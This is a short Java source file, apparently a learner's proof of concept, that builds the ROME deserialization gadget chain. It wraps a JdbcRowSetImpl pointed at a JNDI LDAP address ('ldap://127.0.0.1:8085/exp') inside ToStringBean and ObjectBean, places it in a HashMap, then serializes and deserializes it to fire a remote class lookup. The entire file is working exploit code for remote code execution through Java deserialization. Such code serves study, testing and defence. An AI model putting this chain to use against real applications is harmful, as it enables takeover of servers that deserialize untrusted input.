import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.util.HashMap;

import static util.Util.*;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/13
 */
public class ROME_JdbcRowSetImpl {
    public static void main(String[] args) throws Exception{
        String ldap = "ldap://127.0.0.1:8085/exp";
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(ldap);
        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        HashMap<Object, Object> hashMap = makeMap(objectBean,"dragonkeep");
        serialize(hashMap);
        unserialize();
    }
}
